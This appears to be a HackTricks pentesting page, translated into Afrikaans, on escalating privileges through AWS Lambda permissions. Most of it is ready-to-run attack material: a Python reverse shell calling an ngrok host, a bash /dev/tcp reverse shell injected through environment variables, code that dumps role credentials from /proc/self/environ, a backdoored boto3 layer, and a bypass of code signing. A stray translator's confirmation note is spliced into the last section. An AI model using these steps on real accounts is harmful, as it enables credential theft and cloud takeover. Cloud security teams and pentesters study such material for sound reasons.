# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Meer inligting oor lambda in:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Gebruikers met die **`iam:PassRole`, `lambda:CreateFunction`, en `lambda:InvokeFunction`** toestemmings kan hul voorregte eskaleer.\
Hulle kan **create a new Lambda function and assign it an existing IAM role**, wat die funksie die toestemmings gee wat met daardie rol geassosieer word. Die gebruiker kan dan **write and upload code to this Lambda function (with a rev shell for example)**.\
Sodra die funksie opgestel is, kan die gebruiker **trigger its execution** en die beoogde aksies uitvoer deur die Lambda function via die AWS API aan te roep. Hierdie benadering laat die gebruiker toe om take indirek deur die Lambda function uit te voer, met die vlak van toegang wat aan die geassosieerde IAM role toegeken is.\\

'n aanvaller kan dit misbruik om 'n **rev shell en die token te steel**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Jy kan ook **abuse the lambda role permissions** van die lambda function self.\
As die lambda role genoeg permissions gehad het, kon jy dit gebruik om admin rights aan jouself toe te ken:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Dit is ook moontlik om die lambda se roltoegangbewyse te leak sonder 'n eksterne verbinding. Dit sal nuttig wees vir **Network isolated Lambdas** wat vir interne take gebruik word. As daar onbekende security groups is wat jou reverse shells filtreer, sal hierdie stukkie kode jou in staat stel om direk die roltoegangbewyse as die uitset van die lambda te leak.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potensiële impak:** Direkte privesc na die arbitrêre lambda service role wat gespesifiseer is.

> [!CAUTION]
> Neem kennis dat selfs al mag dit interessant lyk **`lambda:InvokeAsync`** **laat nie** op sigself toe om **`aws lambda invoke-async`** uit te voer nie; jy benodig ook `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Soos in die vorige scenario, kan jy jouself die toestemming **`lambda:InvokeFunction`** gee as jy die toestemming **`lambda:AddPermission`** het.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potensiële impak:** Direkte privesc na die gespesifiseerde ewekansige lambda-diensrol.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Gebruikers met **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** toestemmings (en moontlik `dynamodb:PutItem` en `dynamodb:CreateTable`) kan indirek **escalate privileges** selfs sonder `lambda:InvokeFunction`.\  
Hulle kan 'n **Lambda-funksie met kwaadwillige kode skep en dit 'n bestaande IAM-rol toewys**.

In plaas daarvan om die Lambda direk aan te roep, stel die gebruiker 'n bestaande DynamoDB-tabel op of gebruik dit en koppel dit aan die Lambda deur 'n event source mapping. Hierdie opstelling verseker dat die Lambda-funksie **outomaties geaktiveer word wanneer 'n nuwe item** in die tabel ingevoeg word, hetsy deur die gebruiker se aksie of 'n ander proses, en roep sodoende indirek die Lambda-funksie aan en voer die kode uit met die toestemmings van die deurgegee IAM-rol.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
As DynamoDB reeds in die AWS-omgewing aktief is, hoef die gebruiker slegs **die event source mapping op te stel** vir die Lambda-funksie. Indien DynamoDB egter nie in gebruik is nie, moet die gebruiker **'n nuwe tabel skep** met streaming geaktiveer:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Nou is dit moontlik om **die Lambda function aan die DynamoDB table te koppel** deur **'n event source mapping te skep**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Met die Lambda-funksie gekoppel aan die DynamoDB stream, kan die aanvaller **indirek die Lambda trigger deur die DynamoDB stream te aktiveer**. Dit kan bereik word deur **'n item in te voeg** in die DynamoDB table:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potensiële impak:** Direkte privesc na die gespesifiseerde lambda service role.

### `lambda:AddPermission`

'n aanvaller met hierdie toestemming kan **homself (of ander) enige toestemmings gee** (dit genereer resource based policies om toegang tot die resource te verleen):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potensiële impak:** Direkte privesc na die lambda-diensrol wat gebruik word deur toestemming te verleen om die kode te wysig en dit uit te voer.

### `lambda:AddLayerVersionPermission`

'n aanvaller met hierdie toestemming kan **homself (of ander) die toestemming `lambda:GetLayerVersion` verleen**. Hy kan toegang tot die layer kry en daarin soek na kwesbaarhede of sensitiewe inligting.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potensiële impak:** Potensiële toegang tot sensitiewe inligting.

### `lambda:UpdateFunctionCode`

Gebruikers wat die **`lambda:UpdateFunctionCode`** permissie het, kan die kode van 'n bestaande Lambda-funksie wat aan 'n IAM-rol gekoppel is, wysig.\
Die aanvaller kan **die kode van die Lambda wysig om die IAM credentials te exfiltrate**.

Alhoewel die aanvaller dalk nie die direkte vermoë het om die funksie aan te roep nie, as die Lambda-funksie reeds bestaan en in werking is, is dit waarskynlik dat dit deur bestaande werkvloei of gebeurtenisse geaktiveer sal word, wat dus indirek die uitvoering van die gewysigde kode sal fasiliteer.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potensiële impak:** Direkte privesc na die gebruikte lambda service role.

### `lambda:UpdateFunctionConfiguration`

#### RCE via omgewingsveranderlikes

Met hierdie permissies is dit moontlik om omgewingsveranderlikes by te voeg wat veroorsaak dat die Lambda arbitraire kode uitvoer. Byvoorbeeld, in python is dit moontlik om die omgewingsveranderlikes `PYTHONWARNING` en `BROWSER` te misbruik om 'n python-proses arbitraire opdragte uit te voer:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Vir ander scripting languages is daar ander env variables wat jy kan gebruik. Vir meer inligting, sien die subafdelings van scripting languages in:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) maak dit moontlik om **code** in jou lamdba funksie in te sluit, maar dit **afsonderlik te stoor**, sodat die funksie se code klein kan bly en **verskeie funksies code kan deel**.

Binne lambda kan jy die paaie kontroleer waarvandaan python code gelaai word met 'n funksie soos die volgende:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Dit is die plekke:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Byvoorbeeld, die biblioteek boto3 word gelaai vanaf `/var/runtime/boto3` (4de posisie).

#### Eksploitasie

Dit is moontlik om die toestemming `lambda:UpdateFunctionConfiguration` te misbruik om **'n nuwe layer by te voeg** by 'n lambda-funksie. Om arbitrêre code uit te voer, moet hierdie layer 'n **biblioteek hê wat die lambda gaan importeer.** As jy die code van die lambda kan lees, kan jy dit maklik vind. Let ook daarop dat dit moontlik is dat die lambda **reeds 'n layer gebruik** en jy die layer kan **aflaai** en jou **code daarby kan voeg**.

Byvoorbeeld, kom ons veronderstel dat die lambda die biblioteek boto3 gebruik; dit sal 'n plaaslike layer skep met die nuutste weergawe van die biblioteek:
```bash
pip3 install -t ./lambda_layer boto3
```
Jy kan `./lambda_layer/boto3/__init__.py` oopmaak en **add the backdoor in the global code** ('n funksie om credentials te exfiltrate of 'n reverse shell te kry, byvoorbeeld).

Pak dan die `./lambda_layer` gids as 'n zip en **upload the new lambda layer** in jou eie account (of in die slagoffer s'n, maar jy mag dalk nie die nodige toestemmings hê nie).\
Let wel: jy moet 'n python-folder skep en die libraries daarin plaas om /opt/python/boto3 te override. Ook moet die layer **compatible with the python version** wees wat deur die lambda gebruik word, en as jy dit in jou account upload, moet dit in die **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Maak nou die opgelaaide lambda layer **toeganklik vir enige rekening**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
En heg die lambda layer aan die slagoffer lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Die volgende stap sal wees om óf self **invoke the function** as ons kan, of om te wag totdat i**t gets invoked** op normale wyse — wat die veiliger metode is.

'n **more stealth way to exploit this vulnerability** kan gevind word in:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potensiële Impak:** Direkte privesc na die gebruikte lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Miskien kan jy met daardie permissies 'n funksie skep en dit uitvoer deur die URL aan te roep... maar ek kon nie 'n manier vind om dit te toets nie, so laat weet my as jy dit doen!

### Lambda MitM

Sommige lambdas gaan **sensitiewe info van gebruikers in parameters ontvang.** As jy RCE kry in een daarvan, kan jy die inligting wat ander gebruikers daaraan stuur exfiltrate, kyk dit in:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Verwysings

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

As 'n Lambda funksie code signing afdwing, kan 'n aanvaller wat óf die Code Signing Config (CSC) kan verwyder óf dit na Warn kan downgrade, unsigned code na die funksie deploy. Dit omseil integriteitsbeskermings sonder om die funksie se IAM role of triggers te wysig.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Aantekeninge:
- Vir Path B benodig jy nie 'n AWS Signer profiel nie as die CSC policy op `WARN` gestel is (ongetekende artefakte toegelaat).

Stappe (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Berei 'n klein payload voor:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Pad A) Verwyder CSC en werk dan die kode by:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Pad B) Downgrade na Warn en werk die kode by (indien delete nie toegelaat word nie):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Bevestig: ek sal die instruksies volg.

- Ek sal relevante Engelse teks na Afrikaans vertaal.
- Ek sal alle markdown/html-sintaks, tags, links en paths presies onveranderd laat.
- Ek sal nie kode, hacking-tegnieke, algemene hacking-woorde, cloud/SaaS-name (bv. aws, gcp), die woord "leak", "pentesting", of skakels vertaal nie.
- Ek sal geen ekstra inhoud byvoeg nie.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potensiële impak: Vermoë om ewekansige ongetekende code in 'n function' te push en run wat veronderstel was om signed deployments af te dwing, wat moontlik kan lei tot code execution met die function role's permissions.

Opruiming:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

